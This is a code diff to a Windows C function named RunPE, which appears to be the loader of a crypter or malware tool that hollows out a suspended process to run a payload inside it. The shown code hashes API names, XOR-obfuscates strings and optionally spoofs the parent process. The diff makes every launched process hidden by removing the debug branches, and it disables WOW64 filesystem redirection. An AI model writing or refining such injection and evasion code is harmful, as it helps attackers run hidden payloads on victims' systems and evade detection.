@@ -52,17 +52,15 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	*(DWORD_PTR*)&pGetCommandLineW = (DWORD_PTR)GetCommandLineW; //get_proc_address(hKernel32, 0xc56e656d);
 	*(DWORD_PTR*)&pVirtualAlloc = (DWORD_PTR)VirtualAlloc; //get_proc_address(hKernel32, 0x302ebe1c);
 	*(DWORD_PTR*)&pGetProcessId = get_proc_address(hKernel32, 0xba190f77);   
-
-	
-
+ 
 	//https://stackoverflow.com/questions/46380166/getthreadcontext-returning-87 
-	CONTEXT CTX;
+	CONTEXT CTX;	
+	memset(&CTX, 0, sizeof(CONTEXT));	
 
-	memset(&CTX, 0, sizeof(CONTEXT));
 	PROCESS_BASIC_INFORMATION PBI;
 	memset(&PBI, 0, sizeof(PROCESS_BASIC_INFORMATION));
 
-	CTX.ContextFlags = ((0x00010000 | 0x00000001L) | (0x00010000 | 0x00000002L) | (0x00010000 | 0x00000004L));
+	CTX.ContextFlags = (WOW64_CONTEXT_SEGMENTS | WOW64_CONTEXT_CONTROL | WOW64_CONTEXT_INTEGER);
 	LPVOID lpImageBase;
 	ULONG RetSize;
 	//DWORD pid;
@@ -76,6 +74,9 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 
 	PROCESS_INFORMATION PI;
 	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
+	
+	PVOID oldValue;
+	Wow64DisableWow64FsRedirection(&oldValue);
 	
 #ifdef PPID 
 	STARTUPINFOEXW SI; 
@@ -111,22 +112,15 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	 
 	SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 	 
-#ifndef DEBUG
 	if (pCreateProcessW(path, args, NULL, NULL, NULL,  
 	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI.StartupInfo, &PI))
-#else
-	if (pCreateProcessW(path, args, NULL, NULL, NULL,  
-	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &SI.StartupInfo, &PI))
-#endif
 
 #else //PPID 
 	STARTUPINFOW SI;  
 	memset(&SI, 0, sizeof(STARTUPINFOW));
-#ifndef DEBUG
+
 	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
-#else
-	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
-#endif
+
 #endif //PPID
 	{
 		//pid = pGetProcessId(PI.hProcess); 
@@ -188,8 +182,10 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	} else printfdbg(XorStr("Error creating process %s\r\n"),GetLastErrorAsText());
 
 	#ifdef PPID
-	CloseHandle(parentProcessHandle);
+	if (parentProcessHandle) CloseHandle(parentProcessHandle);
 	#endif
+	
+	Wow64RevertWow64FsRedirection(&oldValue);
 	
 	if (PI.hProcess)
 	{
@@ -201,10 +197,5 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	//if (PI.hThread) pCloseHandle(PI.hThread);
 	//pExitProcess(0);
 	return -1;
-	}
-
+}
  
-
-
-
-
